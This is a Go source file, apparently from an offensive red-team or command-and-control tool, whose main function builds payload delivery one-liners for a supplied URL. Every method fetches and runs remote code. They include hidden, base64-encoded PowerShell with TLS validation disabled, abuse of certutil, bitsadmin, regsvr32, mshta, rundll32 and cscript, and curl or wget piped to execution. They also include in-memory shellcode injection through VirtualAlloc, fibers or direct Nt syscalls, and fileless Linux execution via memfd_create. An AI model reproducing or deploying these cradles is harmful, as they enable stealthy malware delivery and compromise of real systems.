package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"unicode/utf16"
)

func encodePS(script string) string {
	encoded := utf16.Encode([]rune(script))
	buf := make([]byte, len(encoded)*2)
	for i, u := range encoded {
		buf[i*2] = byte(u)
		buf[i*2+1] = byte(u >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

func formatPS(script string, encoded bool) string {
	if encoded {
		return "powershell -nop -w hidden -enc " + encodePS(script)
	}
	escaped := strings.ReplaceAll(script, "'", "''")
	return "powershell -nop -w hidden -c '" + escaped + "'"
}

func GenerateOneliner(method string, url string, encoded bool) string {
	switch method {

	case "powershell_iex":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('%s')`, url)
		return formatPS(script, encoded)

	case "powershell_iwr":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(IWR -UseBasicParsing '%s').Content`, url)
		return formatPS(script, encoded)

	case "powershell_download":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$p=$env:TEMP+'\payload.exe';(New-Object Net.WebClient).DownloadFile('%s',$p);Start-Process $p`, url)
		return formatPS(script, encoded)

	case "certutil":
		return fmt.Sprintf(`cmd /c "certutil -urlcache -split -f %s %%TEMP%%\payload.exe && %%TEMP%%\payload.exe"`, url)

	case "curl_bash":
		return fmt.Sprintf(`curl -sk %s | bash`, url)

	case "curl_exe":
		return fmt.Sprintf(`cmd /c "curl -sko %%TEMP%%\payload.exe %s && %%TEMP%%\payload.exe"`, url)

	case "wget":
		return fmt.Sprintf(`wget -q --no-check-certificate -O /tmp/payload %s && chmod +x /tmp/payload && /tmp/payload`, url)

	case "bitsadmin":
		return fmt.Sprintf(`cmd /c "bitsadmin /transfer job /download /priority high %s %%TEMP%%\payload.exe && %%TEMP%%\payload.exe"`, url)

	case "regsvr32":
		return fmt.Sprintf(`regsvr32 /s /n /u /i:%s scrobj.dll`, url)

	case "mshta":
		return fmt.Sprintf(`mshta %s`, url)

	case "rundll32":
		return fmt.Sprintf(`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","%s",false);h.Option(4)=13056;h.Send();eval(h.ResponseText)`, url)

	case "cscript":
		return fmt.Sprintf(`echo var x=new ActiveXObject^("Msxml2.ServerXMLHTTP.6.0"^);x.setOption^(2,13056^);x.open^("GET","%s",false^);x.send^(^);eval^(x.responseText^); > %%TEMP%%\s.js && cscript //nologo //e:jscript %%TEMP%%\s.js && del %%TEMP%%\s.js`, url)

	case "psh_shellcode":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$b=(New-Object Net.WebClient).DownloadData('%s');$d=[char]34;$k=Add-Type -MemberDefinition ('[DllImport('+$d+'kernel32.dll'+$d+')]public static extern IntPtr VirtualAlloc(IntPtr w,uint x,uint y,uint z);[DllImport('+$d+'kernel32.dll'+$d+')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);') -Name K -PassThru;$m=$k::VirtualAlloc(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$k::CreateThread(0,0,$m,0,0,0);[Threading.Thread]::Sleep(-1)`, url)
		return formatPS(script, encoded)

	case "psh_fiber":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$b=(New-Object Net.WebClient).DownloadData('%s');$d=[char]34;$k=Add-Type -MemberDefinition ('[DllImport('+$d+'kernel32.dll'+$d+')]public static extern IntPtr VirtualAlloc(IntPtr w,uint x,uint y,uint z);[DllImport('+$d+'kernel32.dll'+$d+')]public static extern IntPtr ConvertThreadToFiber(IntPtr p);[DllImport('+$d+'kernel32.dll'+$d+')]public static extern IntPtr CreateFiber(uint s,IntPtr a,IntPtr p);[DllImport('+$d+'kernel32.dll'+$d+')]public static extern void SwitchToFiber(IntPtr f);') -Name F -PassThru;$m=$k::VirtualAlloc(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$k::ConvertThreadToFiber(0);$f=$k::CreateFiber(0,$m,0);$k::SwitchToFiber($f)`, url)
		return formatPS(script, encoded)

	case "psh_syscall_inject":
		script := fmt.Sprintf(`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$b=(New-Object Net.WebClient).DownloadData('%s');$d=[char]34;$c=Add-Type -MemberDefinition ('[DllImport('+$d+'ntdll.dll'+$d+')]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr a,IntPtr z,ref IntPtr s,uint t,uint p);[DllImport('+$d+'ntdll.dll'+$d+')]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr a,ref IntPtr s,uint n,ref uint o);[DllImport('+$d+'ntdll.dll'+$d+')]public static extern uint NtCreateThreadEx(ref IntPtr t,uint a,IntPtr o,IntPtr p,IntPtr r,IntPtr param,bool f,int z,int c,int rc,IntPtr ai);') -Name N -PassThru;$a=[IntPtr]::Zero;$s=[IntPtr]$b.Length;$c::NtAllocateVirtualMemory(-1,[ref]$a,0,[ref]$s,0x3000,0x04);[Runtime.InteropServices.Marshal]::Copy($b,0,$a,$b.Length);$s=[IntPtr]$b.Length;$o=0;$c::NtProtectVirtualMemory(-1,[ref]$a,[ref]$s,0x20,[ref]$o);$t=[IntPtr]::Zero;$c::NtCreateThreadEx([ref]$t,0x1FFFFF,0,-1,$a,0,$false,0,0,0,0);[Threading.Thread]::Sleep(-1)`, url)
		return formatPS(script, encoded)

	case "linux_memfd":
		return fmt.Sprintf(`curl -sk %s -o /dev/shm/.b && chmod +x /dev/shm/.b && /dev/shm/.b; rm -f /dev/shm/.b`, url)

	case "linux_memfd_python":
		return fmt.Sprintf(`python3 -c "import urllib.request,os,ssl;ctx=ssl._create_unverified_context();d=urllib.request.urlopen('%s',context=ctx).read();fd=os.memfd_create('');os.write(fd,d);os.execve('/proc/self/fd/'+str(fd),[''],os.environ)"`, url)

	default:
		return ""
	}
}

var DeliveryMethods = []struct {
	Key     string
	Display string
}{
	{"powershell_download", "PowerShell Download + Exec"},
	{"certutil", "certutil"},
	{"curl_exe", "curl Download + Exec"},
	{"curl_bash", "curl | bash (Linux)"},
	{"wget", "wget (Linux)"},
	{"bitsadmin", "bitsadmin (no SSL bypass)"},
	{"powershell_iex", "PowerShell IEX"},
	{"powershell_iwr", "PowerShell IWR"},
	{"mshta", "mshta (HTA, no SSL bypass)"},
	{"regsvr32", "regsvr32 (.sct, no SSL bypass)"},
	{"rundll32", "rundll32 (JS)"},
	{"cscript", "cscript (JS)"},
	{"psh_shellcode", "PowerShell Shellcode (VirtualAlloc)"},
	{"psh_fiber", "PowerShell Shellcode (Fiber)"},
	{"psh_syscall_inject", "PowerShell Shellcode (Nt Syscalls)"},
	{"linux_memfd", "Linux /dev/shm exec"},
	{"linux_memfd_python", "Linux memfd_create (Python)"},
}
